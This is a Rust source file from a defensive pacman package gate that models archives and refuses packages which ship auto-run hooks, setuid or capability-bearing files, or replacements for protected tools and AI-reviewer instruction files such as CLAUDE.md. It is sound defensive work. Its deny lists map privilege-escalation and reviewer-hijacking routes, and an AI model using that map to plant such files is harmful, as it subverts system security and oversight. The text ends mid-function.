//! What a package archive holds, and the files in it that run, or grant
//! privileges, on their own: without the install scriptlet, pacman hooks and
//! their scripts run on later transactions, sudoers and polkit rules grant
//! root, enabled systemd units, drop-ins, udev, sysctl and modprobe rules,
//! tmpfiles and sysusers entries run at boot or on events, initcpio and
//! kernel-install hooks run at every kernel update, and login scripts,
//! autostart entries, cron jobs and D-Bus services run on their own
//! schedule. The pacman gate reviews these with the AI alongside the
//! scriptlet, and with them the package's own text files that the scriptlet
//! or one of those files names (a script a hook hands to an interpreter, a
//! file a login script sources); the rest of the payload is not reviewed.
//!
//! Every decision is made against one exact model of the archive: two full
//! listings (names only, and details with numeric owners) zipped line by
//! line. A name libalpm would install somewhere other than where Guardian
//! reads it (`etc//x`, `/etc/x`, `etc/../x`), a duplicate entry (a second
//! `.INSTALL`), a non-regular metadata file, an entry under a symbolic-link
//! directory or an unknown entry type makes the whole package fail closed.
//! Links are resolved inside the model, never on disk, and only regular
//! files are extracted, into a private directory, and read without
//! following links. The archive is opened once; every pass reads that open
//! file, and its path must still name it, with the same bytes, once the
//! review is over (see `Fingerprint`).

use std::collections::{HashMap, HashSet};
use std::ffi::OsString;
use std::fs::{self, File, Metadata, OpenOptions};
use std::io::{self, Read};
use std::os::fd::AsRawFd;
use std::os::unix::fs::{MetadataExt, OpenOptionsExt};
use std::path::{Path, PathBuf};

use crate::autorun::{
    Location, is_alias_of_reviewed_directory, is_auto_run_directory, is_reviewed, named_words,
    sweep_only_location,
};
use crate::config::model::SourceClass;
use crate::content::{self, Content, PROBE_SIZE, Prefix};
use crate::error::{Error, IoContext};
use crate::rules;
use crate::sandbox::Workspace;
use crate::scan::MAX_TEXT_FILE_SIZE;
use crate::sha256::{Digest, Sha256};
use crate::tools::{self, Limits};

/// The archive's own metadata; any other name starting with `.` is refused.
const METADATA: &[&str] = &[".PKGINFO", ".BUILDINFO", ".MTREE", ".INSTALL", ".CHANGELOG"];

/// More matching files than any real package ships; a payload beyond these
/// limits is not reviewed, and the review is incomplete.
const MAX_FILES: usize = 2000;
const MAX_TOTAL: u64 = 32 * 1024 * 1024;
/// Symbolic links followed from one entry before giving up.
const MAX_HOPS: usize = 40;
/// How far the package's own files are followed from its scriptlet and
/// auto-run files (a hook names a script, which sources another), and how
/// many of them: past either, the review is incomplete. Guardian's own
/// package is five deep (hook, script, interceptor, theme gate, program).
const MAX_NAMED_DEPTH: usize = 8;
const MAX_NAMED_FILES: usize = 500;

const LISTING_LIMITS: Limits = Limits {
    timeout_secs: 300,
    max_output: 64 * 1024 * 1024,
};
const EXTRACT_LIMITS: Limits = Limits {
    timeout_secs: 300,
    max_output: 1024 * 1024,
};
const C_LOCALE: &[(&str, &str)] = &[("LC_ALL", "C")];

/// `O_NOFOLLOW`, `O_DIRECTORY` and `O_NONBLOCK`. The generic Linux ABI
/// (`x86_64`, `riscv64`) and Arm's give the first two different bits.
#[cfg(not(any(target_arch = "arm", target_arch = "aarch64")))]
pub const O_NOFOLLOW: i32 = 0o400_000;
#[cfg(any(target_arch = "arm", target_arch = "aarch64"))]
pub const O_NOFOLLOW: i32 = 0o100_000;
#[cfg(not(any(target_arch = "arm", target_arch = "aarch64")))]
pub const O_DIRECTORY: i32 = 0o200_000;
#[cfg(any(target_arch = "arm", target_arch = "aarch64"))]
pub const O_DIRECTORY: i32 = 0o40_000;
pub const O_NONBLOCK: i32 = 0o4000;

/// Who may ship a protected path.
#[derive(Clone, Copy, Debug)]
enum Owner {
    /// No package: Guardian's own configuration and hook link.
    Nobody,
    /// The `omarchy-guardian` package, installed from a local archive
    /// (`install.sh` uses `-U`) or an official repository: a third-party
    /// repository offering a package of that name does not get to replace
    /// the gate.
    Guardian,
    /// These packages, from an official repository only.
    Packages(&'static [&'static str]),
    /// Any package from an official repository: the tools the gate runs.
    Official,
}

/// Paths whose replacement disarms the gate: its policy, its reviewer and
/// the tools it trusts. A trailing `/` protects the whole directory.
const PROTECTED: &[(&str, Owner)] = &[
    ("etc/omarchy-guardian/", Owner::Nobody),
    // Root's own mark that the gate is on (see the hook script), and the
    // hook libalpm always loads.
    ("etc/pacman.d/hooks/omarchy-guardian.hook", Owner::Nobody),
    (
        "usr/share/libalpm/hooks/omarchy-guardian.hook",
        Owner::Guardian,
    ),
    ("usr/bin/omarchy-guardian", Owner::Guardian),
    ("usr/lib/omarchy-guardian/", Owner::Guardian),
    ("usr/share/omarchy-guardian/", Owner::Guardian),
    // What only root's halves write: the user's permits and the sweep's
    // allow list. A file a package put there would be root's as well.
    ("var/lib/omarchy-guardian/", Owner::Nobody),
    ("usr/bin/opencode", Owner::Packages(&["opencode"])),
    ("usr/local/bin/opencode", Owner::Packages(&["opencode"])),
    ("usr/bin/claude", Owner::Packages(&["claude-code"])),
    ("usr/local/bin/claude", Owner::Packages(&["claude-code"])),
    ("opt/claude-code/", Owner::Packages(&["claude-code"])),
    // What the reviewer reads as its own instructions and settings: the
    // system-wide configuration of either CLI (neither package ships one),
    // and the project files a CLI started in `/usr` or `/` would pick up.
    // A name starting with `.` at the top of an archive is refused with
    // the model already.
    ("etc/opencode/", Owner::Nobody),
    ("etc/claude-code/", Owner::Nobody),
    ("usr/AGENTS.md", Owner::Nobody),
    ("usr/CLAUDE.md", Owner::Nobody),
    ("usr/CLAUDE.local.md", Owner::Nobody),
    ("usr/CONTEXT.md", Owner::Nobody),
    ("usr/opencode.json", Owner::Nobody),
    ("usr/opencode.jsonc", Owner::Nobody),
    ("usr/.mcp.json", Owner::Nobody),
    ("usr/.opencode/", Owner::Nobody),
    ("usr/.claude/", Owner::Nobody),
    ("AGENTS.md", Owner::Nobody),
    ("CLAUDE.md", Owner::Nobody),
    ("CLAUDE.local.md", Owner::Nobody),
    ("CONTEXT.md", Owner::Nobody),
    ("opencode.json", Owner::Nobody),
    ("opencode.jsonc", Owner::Nobody),
    ("usr/bin/bsdtar", Owner::Official),
    ("usr/bin/pacman", Owner::Official),
    ("usr/bin/pacman-conf", Owner::Official),
    ("usr/bin/timeout", Owner::Official),
    ("usr/bin/kill", Owner::Official),
    ("usr/bin/curl", Owner::Official),
    ("usr/bin/bwrap", Owner::Official),
    ("usr/bin/runuser", Owner::Official),
    ("usr/bin/env", Owner::Official),
    ("usr/bin/sudo", Owner::Official),
    // What the root half of the hook script runs.
    ("usr/bin/sh", Owner::Official),
    ("usr/bin/bash", Owner::Official),
    ("usr/bin/readlink", Owner::Official),
    ("usr/bin/id", Owner::Official),
    ("usr/bin/getent", Owner::Official),
    ("usr/bin/cut", Owner::Official),
    // Reads what pacman recorded of the installed packages' links.
    ("usr/bin/gzip", Owner::Official),
    // Write and read the audit trail.
    ("usr/bin/logger", Owner::Official),
    ("usr/bin/journalctl", Owner::Official),
];

/// Top-level directories no package installs files into: runtime and
/// temporary file systems, and the home directories. A unit or generator
/// under `/run/systemd`, or a key in `/root/.ssh`, would act like any
/// auto-run file with nothing here looking at it.
const NOT_FOR_PACKAGES: &[&str] = &["run/", "tmp/", "dev/", "proc/", "sys/", "root/", "home/"];

/// The directory links every system has (`/bin` is `usr/bin`): an entry
/// listed under one would replace the link with a directory of its own.
const ROOT_LINKS: &[&str] = &["bin/", "sbin/", "lib/", "lib64/"];
/// The same inside `/usr`: `usr/sbin` is `bin` and `usr/lib64` is `lib`.
/// The `filesystem` package ships the links themselves, never an entry
/// under one.
const USR_LINKS: &[&str] = &["usr/sbin/", "usr/lib64/"];

/// `path` (relative to `/`) as the system reads it through those links:
/// `bin/sh` and `usr/sbin/sh` are `usr/bin/sh`.
pub fn through_root_links(path: &str) -> String {
    for (link, leads) in [
        ("bin/", "usr/bin/"),
        ("sbin/", "usr/bin/"),
        ("lib/", "usr/lib/"),
        ("lib64/", "usr/lib/"),
        ("usr/sbin/", "usr/bin/"),
        ("usr/lib64/", "usr/lib/"),
    ] {
        if let Some(rest) = path.strip_prefix(link) {
            return format!("{leads}{rest}");
        }
    }
    path.to_string()
}

/// Guardian's own package. What other packages a `.PKGINFO` may not claim
/// to replace, conflict with or provide: pacman would then remove Guardian
/// for it.
pub const GUARDIAN_PACKAGE: &str = "omarchy-guardian";
/// What a package of that name must ship to be Guardian: an "upgrade" to
/// one without its program or hook script takes the gate away.
const GUARDIAN_FILES: &[&str] = &[
    "usr/bin/omarchy-guardian",
    "usr/lib/omarchy-guardian/guardian-pacman-hook",
];
/// The packages of the reviewer CLIs, as `PROTECTED` names them.
const REVIEWERS: &[&str] = &["opencode", "claude-code"];

/// Why a package named `package` (of `class`) may not be installed at all:
/// a package of Guardian's name, or of its reviewer's, replaces the
/// installed one whatever it ships, an empty one included.
fn name_violation(package: &str, class: SourceClass, trusted: &[String]) -> Option<String> {
    if package == GUARDIAN_PACKAGE && class == SourceClass::ThirdPartyRepo {
        return Some(format!(
            "{package} is offered by a third-party repository: Guardian is installed from a local archive or an official repository only, and a package of its name would replace it"
        ));
    }
    if REVIEWERS.contains(&package)
        && class != SourceClass::Official
        && !trusted.iter().any(|name| name == package)
    {
        return Some(format!(
            "{package} does not come from an official repository: a package of that name would replace Guardian's reviewer (name it in trusted_reviewer_packages to allow it)"
        ));
    }
    None
}

/// The first line of `pkginfo` by which `package` claims the place of
/// Guardian or of its reviewer (`replaces`, `conflict`, `provides`), with
/// what it would take away. Guardian is nobody else's to claim; a reviewer
/// may be claimed by a package that could ship it (see `PROTECTED`).
fn claim_violation<'a>(
    pkginfo: &'a str,
    package: &str,
    class: SourceClass,
    trusted: &[String],
) -> Option<(&'a str, &'static str)> {
    let may_ship_reviewer =
        class == SourceClass::Official || trusted.iter().any(|name| name == package);
    pkginfo.lines().find_map(|line| {
        let claimed = ["replaces = ", "conflict = ", "provides = "]
            .iter()
            .find_map(|key| line.strip_prefix(key))?
            .trim()
            .split(['<', '>', '='])
            .next()
            .map(str::trim)?;
        if claimed == package {
            None
        } else if claimed == GUARDIAN_PACKAGE {
            Some((line.trim(), "Guardian"))
        } else if (REVIEWERS.contains(&claimed) || trusted.iter().any(|name| name == claimed))
            && !may_ship_reviewer
        {
            Some((line.trim(), "Guardian's reviewer"))
        } else {
            None
        }
    })
}

/// Whether `package` (of `class`) may ship `path`; `trusted` names extra
/// reviewer packages the root-owned system configuration allows.
fn protected_violation(
    path: &str,
    package: &str,
    class: SourceClass,
    trusted: &[String],
) -> Option<String> {
    let (protected, owner) = PROTECTED.iter().find(|(protected, _)| {
        if let Some(directory) = protected.strip_suffix('/') {
            path == directory || path.starts_with(protected)
        } else {
            path == *protected
        }
    })?;
    let official = class == SourceClass::Official;
    let allowed = match owner {
        Owner::Nobody => false,
        Owner::Guardian => package == "omarchy-guardian" && class != SourceClass::ThirdPartyRepo,
        Owner::Packages(packages) => {
            (official && packages.contains(&package)) || trusted.iter().any(|name| name == package)
        }
        Owner::Official => official,
    };
    (!allowed).then(|| {
        format!(
            "{package} ships /{path}, which {} may provide: it could disarm Guardian",
            match owner {
                Owner::Nobody => "no package".to_string(),
                Owner::Guardian =>
                    "only the omarchy-guardian package, installed from a local archive or an official repository,"
                        .to_string(),
                Owner::Packages(packages) => format!(
                    "only {} from an official repository (or a package named in trusted_reviewer_packages)",
                    packages.join(" or ")
                ),
                Owner::Official => "only a package from an official repository".to_string(),
            },
            path = protected.trim_end_matches('/')
        )
    })
}

#[derive(Clone, Debug, PartialEq, Eq)]
enum Kind {
    File,
    Directory,
    Symlink(String),
    /// A hard link to an earlier regular entry of the archive.
    HardLink(String),
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct Entry {
    path: String,
    size: u64,
    kind: Kind,
    /// A regular file installed setuid or setgid root (it runs as root for
    /// whoever starts it, with no scriptlet involved), or one under `/usr`,
    /// `/etc` or `/opt` that everyone may write (whoever writes it decides
    /// what the next one to run or read it gets).
    root_set_id: Option<&'static str>,
}

/// Undoes bsdtar's (and mtree's) escaping of names (`\\`, `\n`, `\t` and
/// octal `\ooo`); `None` for a name that is not UTF-8 or holds control
/// characters.
pub fn unescape(raw: &str) -> Option<String> {
    let mut bytes = Vec::with_capacity(raw.len());
    let mut input = raw.bytes().peekable();
    while let Some(byte) = input.next() {
        if byte != b'\\' {
            bytes.push(byte);
            continue;
        }
        let escaped = match input.next()? {
            b'\\' => b'\\',
            b'n' => b'\n',
            b't' => b'\t',
            b'r' => b'\r',
            b'a' => 7,
            b'b' => 8,
            b'f' => 12,
            b'v' => 11,
            digit @ b'0'..=b'7' => {
                let mut value = u32::from(digit - b'0');
                for _ in 0..2 {
                    let next = input.next().filter(u8::is_ascii_digit)?;
                    value = value * 8 + u32::from(next - b'0');
                }
                u8::try_from(value).ok()?
            }
            _ => return None,
        };
        bytes.push(escaped);
    }
    let text = String::from_utf8(bytes).ok()?;
    (!text.chars().any(char::is_control)).then_some(text)
}

/// What a listed mode (`-rwsr-xr-x`) with its numeric owner and group
/// grants beyond an ordinary root-owned file: set-id bits, for root or for
/// anyone else.
fn root_set_id(mode: &str, owner: &str, group: &str) -> Option<&'static str> {
    let set = |position: usize| matches!(mode.as_bytes().get(position), Some(b's' | b'S'));
    match (set(3), set(6)) {
        (true, _) if owner == "0" => Some(SETUID_ROOT),
        (_, true) if group == "0" => Some(SETGID_ROOT),
        (true, _) => Some(SETUID_OTHER),
        (_, true) => Some(SETGID_OTHER),
        _ => None,
    }
}

pub const SETUID_ROOT: &str = "setuid root";
pub const SETGID_ROOT: &str = "setgid root";
/// It runs as its owner, or with its group (`disk`, `shadow`, `kmem` reach
/// far), for whoever starts it.
pub const SETUID_OTHER: &str = "setuid for a user other than root";
pub const SETGID_OTHER: &str = "setgid for a group other than root";
/// What to call an entry that carries file capabilities, and one with an
/// access control list.
pub const WITH_CAPABILITIES: &str = "with file capabilities";
pub const WITH_ACL: &str = "with an access control list";
/// What to call a file or directory anyone may write, where the system's
/// own files are, and one that is somebody else's to write.
pub const WRITABLE_BY_ALL: &str = "writable by everyone";
pub const OWNED_BY_OTHER: &str = "owned by a user other than root";
pub const WRITABLE_BY_GROUP: &str = "writable by a group other than root";

/// Whether a listed entry under `/usr`, `/etc` or `/opt` can be written by
/// someone other than root: by everyone, by its owner, or by its group.
/// Whoever writes a file there decides what the next one to run or read it
/// gets; whoever writes a directory decides what is in it (a drop-in for a
/// root service, say).
fn open_to_others(mode: &str, owner: &str, group: &str, path: &str) -> Option<&'static str> {
    if !["usr/", "etc/", "opt/"]
        .iter()
        .any(|system| path.starts_with(system))
    {
        return None;
    }
    let bytes = mode.as_bytes();
    if bytes.get(8) == Some(&b'w') && !matches!(bytes.get(9), Some(b't' | b'T')) {
        Some(WRITABLE_BY_ALL)
    } else if owner != "0" {
        Some(OWNED_BY_OTHER)
    } else if bytes.get(5) == Some(&b'w') && group != "0" {
        Some(WRITABLE_BY_GROUP)
    } else {
        None
    }
}

/// Whether what `what` names is how the installed file already is: then a
/// package that ships it that way again grants nothing new. Capabilities
/// and access lists are not read back, so those are said every time.
pub fn already_granted(what: &str, installed: &Metadata) -> bool {
    let mode = installed.mode();
    let (uid, gid) = (installed.uid(), installed.gid());
    match what {
        SETUID_ROOT => installed.is_file() && mode & 0o4000 != 0 && uid == 0,
        SETGID_ROOT => installed.is_file() && mode & 0o2000 != 0 && gid == 0,
        SETUID_OTHER => installed.is_file() && mode & 0o4000 != 0 && uid != 0,
        SETGID_OTHER => installed.is_file() && mode & 0o2000 != 0 && gid != 0,
        WRITABLE_BY_ALL => !installed.file_type().is_symlink() && mode & 0o002 != 0,
        OWNED_BY_OTHER => !installed.file_type().is_symlink() && uid != 0,
        WRITABLE_BY_GROUP => !installed.file_type().is_symlink() && mode & 0o020 != 0 && gid != 0,
        _ => false,
    }
}

/// The entries of an uncompressed pax tar stream whose extended header
/// carries a `security.*` or `trusted.*` attribute (file capabilities:
/// root-like rights for whoever runs the file) or an access control list
/// (rights the mode does not show), with what to call them.
fn attributes_in_tar(mut stream: impl Read) -> Result<Vec<Attribute>, String> {
    let mut found = Vec::new();
    // What the extended header before the next entry said.
    let mut pending: Option<(&'static str, Option<String>)> = None;
    let mut path_override: Option<String> = None;
    let mut header = [0_u8; 512];
    loop {
        if let Err(error) = stream.read_exact(&mut header) {
            return if error.kind() == io::ErrorKind::UnexpectedEof {
                Ok(found)
            } else {
                Err(error.to_string())
            };
        }
        if header.iter().all(|byte| *byte == 0) {
            continue;
        }
        // Up to the first NUL, and otherwise as written: a name may end
        // in a blank.
        let field = |range: std::ops::Range<usize>| {
            let bytes = &header[range];
            let end = bytes
                .iter()
                .position(|byte| *byte == 0)
                .unwrap_or(bytes.len());
            String::from_utf8_lossy(&bytes[..end]).into_owned()
        };
        let size = u64::from_str_radix(field(124..136).trim(), 8)
            .map_err(|_| "an entry size that is not a number".to_string())?;
        let blocks = size.div_ceil(512) * 512;
        // A pax extended header for the next entry (`x`) or for all that
        // follow (`g`).
        let kind = header[156];
        if matches!(kind, b'x' | b'g') {
            if size > 1 << 20 {
                return Err("an extended header larger than 1 MiB".into());
            }
            let mut data = vec![0_u8; usize::try_from(blocks).map_err(|_| "size")?];
            stream
                .read_exact(&mut data)
                .map_err(|error| error.to_string())?;
            data.truncate(usize::try_from(size).map_err(|_| "size")?);
            let records = pax_records(&data);
            if kind == b'x' {
                path_override = records.path;
            }
            if let Some(what) = records.what {
                pending = Some((what, records.capability));
            }
            continue;
        }
        let name = path_override.take().unwrap_or_else(|| {
            let (prefix, name) = (field(345..500), field(0..100));
            if prefix.is_empty() {
                name
            } else {
                format!("{prefix}/{name}")
            }
        });
        if let Some((what, capability)) = pending.take() {
            found.push((name.trim_end_matches('/').to_string(), what, capability));
        }
        let mut left = blocks;
        let mut sink = [0_u8; 8192];
        while left > 0 {
            let take = usize::try_from(left.min(8192)).unwrap_or(8192);
            stream
                .read_exact(&mut sink[..take])
                .map_err(|error| error.to_string())?;
            left -= take as u64;
        }
    }
}

/// From a pax extended header's records (`<length> <key>=<value>\n`): what
/// its attributes grant, if anything, and the entry's path if it gives one.
fn pax_records(data: &[u8]) -> Records {
    let mut found = Records::default();
    // Another `security.*` or `trusted.*` attribute beside the capability:
    // then the capability's value alone does not say what is granted.
    let mut others = false;
    let mut rest = data;
    while let Some(space) = rest.iter().position(|byte| *byte == b' ') {
        let Some(length) = std::str::from_utf8(&rest[..space])
            .ok()
            .and_then(|digits| digits.parse::<usize>().ok())
            .filter(|length| *length > space + 1 && *length <= rest.len())
        else {
            break;
        };
        let record = &rest[space + 1..length];
        let record = record.strip_suffix(b"\n").unwrap_or(record);
        if let Some(equals) = record.iter().position(|byte| *byte == b'=') {
            let key = String::from_utf8_lossy(&record[..equals]);
            let value = &record[equals + 1..];
            if key == "path" || key == "GNU.sparse.name" {
                found.path = Some(String::from_utf8_lossy(value).into_owned());
            } else if key.contains(".xattr.security.") || key.contains(".xattr.trusted.") {
                found.what = Some(WITH_CAPABILITIES);
                // bsdtar writes each attribute twice; the `LIBARCHIVE`
                // record holds its value as base64.
                if key == "LIBARCHIVE.xattr.security.capability" {
                    found.capability = Some(String::from_utf8_lossy(value).into_owned());
                } else if key != "SCHILY.xattr.security.capability" {
                    others = true;
                }
            } else if (key.contains(".acl.") || key.contains(".xattr.system.posix_acl"))
                && found.what.is_none()
            {
                found.what = Some(WITH_ACL);
            }
        }
        rest = &rest[length..];
    }
    if others {
        found.capability = None;
    }
    found
}

/// What a pax extended header says about the entry after it.
#[derive(Default)]
struct Records {
    /// What its attributes grant, if anything.
    what: Option<&'static str>,
    /// The entry's path, if the header gives one.
    path: Option<String>,
    /// The value of its `security.capability` attribute as base64, when
    /// that is its only attribute of the kind.
    capability: Option<String>,
}

/// An entry's path, what its attributes grant, and the value of its file
/// capabilities (see `Records::capability`).
type Attribute = (String, &'static str, Option<String>);

/// An entry under a symbolic-link directory is installed wherever that
/// link points, not where it is listed: such an archive is refused.
fn under_links(entries: &[Entry]) -> Result<(), String> {
    let links: HashSet<&str> = entries
        .iter()
        .filter(|entry| matches!(entry.kind, Kind::Symlink(_)))
        .map(|entry| entry.path.as_str())
        .collect();
    for entry in entries {
        let mut prefix = entry.path.as_str();
        while let Some((parent, _)) = prefix.rsplit_once('/') {
            if links.contains(parent) {
                return Err(format!(
                    "{} is inside {parent}, which is a symbolic link",
                    entry.path
                ));
            }
            prefix = parent;
        }
    }
    Ok(())
}

/// Builds the archive model from `bsdtar -tf` (names) and `bsdtar -tv
/// --numeric-owner` (details) output, refusing anything a real package
/// never contains.
fn parse_model(names: &str, details: &str) -> Result<Vec<Entry>, String> {
    let names: Vec<&str> = names.lines().collect();
    let details: Vec<&str> = details.lines().collect();
    if names.len() != details.len() {
        return Err("the archive's two listings disagree".into());
    }
    let mut entries: Vec<Entry> = Vec::with_capacity(names.len());
    let mut seen: HashMap<String, usize> = HashMap::new();
    for (raw_name, line) in names.iter().zip(&details) {
        let mut rest = *line;
        let mut fields = Vec::with_capacity(8);
        for _ in 0..8 {
            rest = rest.trim_start();
            let end = rest
                .find(char::is_whitespace)
                .ok_or_else(|| format!("unreadable listing line {line:?}"))?;
            fields.push(&rest[..end]);
            rest = &rest[end..];
        }
        let after = rest
            .strip_prefix(' ')
            .and_then(|rest| rest.strip_prefix(*raw_name))
            .ok_or_else(|| format!("unreadable listing line {line:?}"))?;
        let size: u64 = fields[4]
            .parse()
            .map_err(|_| format!("unreadable size in {line:?}"))?;
        let bad = || format!("an entry name Guardian refuses: {raw_name:?}");
        let mut path = unescape(raw_name).ok_or_else(bad)?;
        let kind = match (fields[0].chars().next(), after) {
            (Some('-'), "") => Kind::File,
            (Some('d'), "") => {
                if let Some(trimmed) = path.strip_suffix('/') {
                    path = trimmed.to_string();
                }
                Kind::Directory
            }
            (Some('l'), rest) => Kind::Symlink(
                rest.strip_prefix(" -> ")
                    .and_then(unescape)
                    .ok_or_else(bad)?,
            ),
            (Some('h'), rest) => Kind::HardLink(
                rest.strip_prefix(" link to ")
                    .and_then(unescape)
                    .ok_or_else(bad)?,
            ),
            _ => return Err(format!("an entry of a type Guardian refuses: {line:?}")),
        };
        if path.is_empty()
            || path.starts_with('/')
            || path
                .split('/')
                .any(|component| matches!(component, "" | "." | ".."))
        {
            return Err(bad());
        }
        let top = path.split('/').next().unwrap_or_default();
        if top.starts_with('.') {
            if !METADATA.contains(&path.as_str()) {
                return Err(bad());
            }
            if kind != Kind::File {
                return Err(format!("{path} is not a regular file"));
            }
        }
        if let Kind::HardLink(target) = &kind {
            let regular = seen
                .get(target)
                .is_some_and(|index| entries[*index].kind == Kind::File);
            if !regular {
                return Err(format!(
                    "{path} is a hard link to {target}, which is not an earlier regular file"
                ));
            }
        }
        if seen.insert(path.clone(), entries.len()).is_some() {
            return Err(format!("{path} appears more than once"));
        }
        let root_set_id = match kind {
            Kind::File | Kind::HardLink(_) => root_set_id(fields[0], fields[2], fields[3])
                .or_else(|| open_to_others(fields[0], fields[2], fields[3], &path)),
            Kind::Directory => open_to_others(fields[0], fields[2], fields[3], &path),
            Kind::Symlink(_) => None,
        };
        entries.push(Entry {
            path,
            size,
            kind,
            root_set_id,
        });
    }
    under_links(&entries)?;
    Ok(entries)
}

/// Where a symbolic link leads, resolved inside the archive model.
#[derive(Clone, Debug, PartialEq, Eq)]
enum Resolution {
    /// A regular file the package ships.
    Regular(String),
    /// Somewhere the package does not ship (another package's file).
    Outside(String),
}

/// What an archive ships at a path.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum InArchive {
    Absent,
    /// A directory, a link, or a file that could not be read.
    Other,
    File(Vec<u8>),
}

/// A package archive opened once and modelled exactly.
pub struct Archive {
    path: PathBuf,
    file: File,
    identity: Identity,
    entries: Vec<Entry>,
    index: HashMap<String, usize>,
    /// The file capabilities the archive gives its entries, by path, as
    /// the base64 of the attribute's value.
    capabilities: HashMap<String, String>,
}

/// Which file a path names, and when it was last written or changed. The
/// change time is the kernel's own: a write in place moves it, and nobody
/// but root (by setting the clock) can move it back.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
struct Identity {
    dev: u64,
    ino: u64,
    size: u64,
    mtime: (i64, i64),
    ctime: (i64, i64),
}

impl Identity {
    fn of(metadata: &Metadata) -> Self {
        Self {
            dev: metadata.dev(),
            ino: metadata.ino(),
            size: metadata.len(),
            mtime: (metadata.mtime(), metadata.mtime_nsec()),
            ctime: (metadata.ctime(), metadata.ctime_nsec()),
        }
    }
}

/// What an archive was when its review began: the file its path named and
/// the SHA-256 of its bytes. The AI review takes minutes, and an archive
/// given to `pacman -U` may lie where its owner can rewrite it in place
/// meanwhile; `verify` is asked again once the review is over. The digest
/// is also what the audit trail records and a permit is bound to.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Fingerprint {
    path: PathBuf,
    identity: Identity,
    digest: Digest,
    /// Whether `verify` hashes the bytes again: not for a file only root
    /// can write (see `root_alone`).
    rehash: bool,
}

/// Whether only root can write the file at `path` or put another in its
/// place: it and every directory above it are root's, and not writable by
/// a group or by everyone. That is pacman's own cache, where a system
/// upgrade keeps gigabytes of archives: whoever rewrites one of those is
/// root already, so once hashed they are told apart by the file and its
/// change time alone, without hashing each twice.
fn root_alone(path: &Path, file: &Metadata) -> bool {
    let roots = |metadata: &Metadata| metadata.uid() == 0 && metadata.mode() & 0o022 == 0;
    roots(file)
        && path.is_absolute()
        && path.ancestors().skip(1).all(|directory| {
            fs::symlink_metadata(directory)
                .is_ok_and(|metadata| metadata.is_dir() && roots(&metadata))
        })
}

impl Fingerprint {
    /// The SHA-256 of the archive's bytes as they were reviewed.
    pub const fn digest(&self) -> &Digest {
        &self.digest
    }

    /// The archive by its file name without `.pkg.tar.*`: the package's
    /// name, version, build and architecture.
    pub fn name(&self) -> String {
        let name = self
            .path
            .file_name()
            .map(|name| name.to_string_lossy().into_owned())
            .unwrap_or_default();
        name.split_once(".pkg.tar")
            .map_or(name.as_str(), |(stem, _)| stem)
            .to_string()
    }

    /// The path must still name the same file, unchanged, holding the same
    /// bytes.
    pub fn verify(&self) -> Result<(), Error> {
        let changed = || {
            Error::Refused(format!(
                "{} changed while it was being reviewed",
                self.path.display()
            ))
        };
        let file = OpenOptions::new()
            .read(true)
            .custom_flags(O_NOFOLLOW | O_NONBLOCK)
            .open(&self.path)
            .map_err(|_| changed())?;
        let same = |metadata: io::Result<Metadata>| {
            metadata.is_ok_and(|metadata| {
                metadata.is_file() && Identity::of(&metadata) == self.identity
            })
        };
        if !same(file.metadata()) || (self.rehash && digest_of(&file).ok() != Some(self.digest)) {
            return Err(changed());
        }
        // Hashing took its time too: still that file, not written since.
        if same(fs::symlink_metadata(&self.path)) {
            Ok(())
        } else {
            Err(changed())
        }
    }
}

/// The SHA-256 of everything `file` holds from where it stands, read in
/// pieces: an archive may be gigabytes.
fn digest_of(mut file: &File) -> io::Result<Digest> {
    let mut hasher = Sha256::new();
    let mut buffer = vec![0_u8; 1 << 16];
    loop {
        match file.read(&mut buffer) {
            Ok(0) => return Ok(hasher.finalize()),
            Ok(count) => hasher.update(&buffer[..count]),
            Err(error) if error.kind() == io::ErrorKind::Interrupted => {}
            Err(error) => return Err(error),
        }
    }
}

/// What an archive puts where a link on the system leads (see
/// `Archive::replacement`).
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Replacement {
    /// A file small enough to read, with its bytes.
    File(Vec<u8>),
    /// A larger file that is no text, by what it is.
    Binary(&'static str),
    /// Text of this archive over the review limit: unread, but its bytes
    /// are the archive's.
    TooLarge,
    /// Something that cannot be read, and why.
    Unreadable(&'static str),
}

impl Archive {
    /// Opens `path` (not following a link), lists it twice and builds the
    /// model; any listing that is not a clean package fails.
    pub fn open(path: &Path) -> Result<Self, Error> {
        let file = OpenOptions::new()
            .read(true)
            .custom_flags(O_NOFOLLOW | O_NONBLOCK)
            .open(path)
            .at(path)?;
        let metadata = file.metadata().at(path)?;
        if !metadata.is_file() {
            return Err(Error::Refused(format!(
                "{} is not a regular file",
                path.display()
            )));
        }
        let mut archive = Self {
            path: path.to_path_buf(),
            file,
            identity: Identity::of(&metadata),
            entries: Vec::new(),
            index: HashMap::new(),
            capabilities: HashMap::new(),
        };
        let names = archive.bsdtar(&["-tf".into(), "-".into()], LISTING_LIMITS)?;
        let details = archive.bsdtar(
            &[
                "-tv".into(),
                "--numeric-owner".into(),
                "-f".into(),
                "-".into(),
            ],
            LISTING_LIMITS,
        )?;
        archive.entries = parse_model(
            &String::from_utf8_lossy(&names),
            &String::from_utf8_lossy(&details),
        )
        .map_err(|reason| Error::Refused(format!("{}: {reason}", path.display())))?;
        archive.index = archive
            .entries
            .iter()
            .enumerate()
            .map(|(index, entry)| (entry.path.clone(), index))
            .collect();
        // What the listing does not show: file capabilities and access
        // control lists, which libalpm restores with the file.
        for (path, what, capability) in archive.attributes()? {
            let index = archive.index.get(&path).copied().ok_or_else(|| {
                Error::Refused(format!(
                    "{}: its attributes name {path:?}, which its listing does not",
                    archive.path.display()
                ))
            })?;
            archive.entries[index].root_set_id.get_or_insert(what);
            if let Some(capability) = capability {
                archive.capabilities.insert(path, capability);
            }
        }
        Ok(archive)
    }

    /// The entries that carry rights beside their mode, read from the
    /// archive rewritten as an uncompressed tar stream: there every such
    /// attribute stands in a header before its entry, whatever compression
    /// and tar dialect the package uses.
    fn attributes(&self) -> Result<Vec<Attribute>, Error> {
        let failed = |detail: String| Error::ToolFailed {
            tool: "bsdtar".into(),
            detail: format!("{}: {detail}", self.path.display()),
        };
        let stdin = File::open(format!("/proc/self/fd/{}", self.file.as_raw_fd())).at(&self.path)?;
        let mut child = std::process::Command::new(tools::TIMEOUT)
            .arg("--signal=TERM")
            .arg("--kill-after=5s")
            .arg(format!("{}s", LISTING_LIMITS.timeout_secs))
            .arg(tools::BSDTAR)
            .args(["-cf", "-", "--format=pax", "@-"])
            .env("LC_ALL", "C")
            .stdin(stdin)
